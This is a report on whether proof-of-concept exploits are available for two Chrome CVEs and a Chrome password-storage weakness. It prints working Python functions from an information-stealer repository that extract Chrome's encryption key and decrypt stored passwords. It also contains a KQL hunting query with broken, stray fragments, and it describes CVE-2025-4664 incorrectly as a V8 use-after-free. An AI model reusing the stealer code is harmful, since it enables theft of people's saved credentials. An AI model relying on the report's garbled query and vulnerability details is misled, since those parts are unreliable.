# Chrome Vulnerabilities PoC Validation Report (May 2025)

This report documents the validation of Proof of Concept (PoC) exploits for Chrome vulnerabilities identified in May 2025.

## 1. CVE-2025-4664: Chrome V8 JavaScript Engine Vulnerability

**Vulnerability Type:** Use-after-free in V8 JavaScript engine  
**Severity:** High (CVSS 8.8)  
**Status:** Confirmed zero-day with public exploit

### PoC Validation:

- **PoC Availability:** Referenced in hunting queries but no public exploit code found on GitHub
- **Evidence Found:**
  - Hunting query file in [khaled180/Threar-Hunting-Rules](https://github.com/khaled180/Threar-Hunting-Rules/commit/c17fc0907786fb7ed32b631a6356dcb4a10698d3) repository
  - File renamed to include "CVE-2025-4664 Chrome flaw with public exploit" in the title
  - Query checks for Chrome versions below 136.0.7103.114 (patched version)
  - References to BleepingComputer articles about CISA tagging this as an actively exploited zero-day

- **KQL Query Content:**
```

| distinct NodeName;

| distinct DName;

| where Timestamp > ago(30d)
| where ProcessVersionInfoProductName == "Google Chrome"
| where ProcessVersionInfoProductVersion != "136.0.7103.114" and
ProcessVersionInfoProductVersion != "136.0.7103.113"
| summarize arg_max(Timestamp, *) by DeviceId
| where DeviceName has_any(AdminDevices)
```

- **PoC Status:** While the hunting query references a public exploit, the actual exploit code was not found in public GitHub repositories. The query suggests the vulnerability is being actively exploited in the wild and is being tracked by security researchers.

- **Affected Versions:** Chrome < 136.0.7103.114

## 2. CVE-2025-2783: Chrome Sandbox Escape Vulnerability

**Vulnerability Type:** Sandbox escape  
**Severity:** Critical (CVSS 9.6)  
**Status:** Confirmed zero-day

### PoC Validation:

- **PoC Availability:** No public PoC found on GitHub
- **Evidence Found:**
  - Referenced in dependency update pull requests across multiple repositories
  - Mentioned in commit by HerbertKwok2001 titled "Delete Re CVE-2025-2783 Actively Exploited Zero-Day Google Chrome Sandbox Escape Vulnerability.msg"
  - No detailed technical information or exploit code found

- **PoC Status:** No public exploit code was found. The vulnerability appears to be known and tracked, with references in dependency updates suggesting it has been patched, but technical details remain limited.

- **Affected Versions:** Chrome < 136.0.7103.113

## 3. Chrome Password Storage Vulnerability

**Vulnerability Type:** Information disclosure  
**Severity:** Medium (requires local access)  
**Status:** By-design vulnerability

### PoC Validation:

- **PoC Availability:** Complete working PoC available in [purab04/Information-Stealer](https://github.com/purab04/Information-Stealer) repository
- **Evidence Found:**
  - Repository contains a fully functional Python script (`info_stealer.py`) that demonstrates the vulnerability
  - Code extracts Chrome's encryption key and decrypts stored passwords
  - Uses legitimate Windows APIs (win32crypt.CryptUnprotectData) to access encrypted data

- **Code Analysis:**
  ```python
  def get_encryption_key():
      path = os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State")
      with open(path, "r", encoding="utf-8") as file:
          local_state = json.loads(file.read())
      key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
      key = key[5:]  # Remove DPAPI prefix
      return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

  def decrypt_password(buff, key):
      try:
          iv = buff[3:15]
          payload = buff[15:]
          cipher = AES.new(key, AES.MODE_GCM, iv)
          return cipher.decrypt(payload).decode()
      except Exception:
          try:
              return str(win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1])
          except:
              return "Decryption Failed"
  ```

- **PoC Status:** Confirmed working code that demonstrates how Chrome's password storage can be compromised. This is not exploiting a specific CVE but rather a design limitation in Chrome's password storage mechanism.

- **Affected Versions:** All Chrome versions (by design)

## Conclusion

Of the three vulnerabilities identified:

1. **CVE-2025-4664**: Referenced as having a public exploit, but the actual exploit code was not found in public GitHub repositories. The hunting query and references suggest it is being actively exploited.

2. **CVE-2025-2783**: No public PoC found. Limited information available beyond references in dependency updates and commit messages.

3. **Chrome Password Storage Vulnerability**: Complete working PoC available in the purab04/Information-Stealer repository. This demonstrates a design limitation rather than a specific CVE.

The most concerning vulnerabilities are the two CVEs (2025-4664 and 2025-2783) as they are being actively exploited in the wild according to references. The Chrome Password Storage vulnerability, while having a complete PoC available, requires local access to the machine and is a known design limitation rather than a new vulnerability.
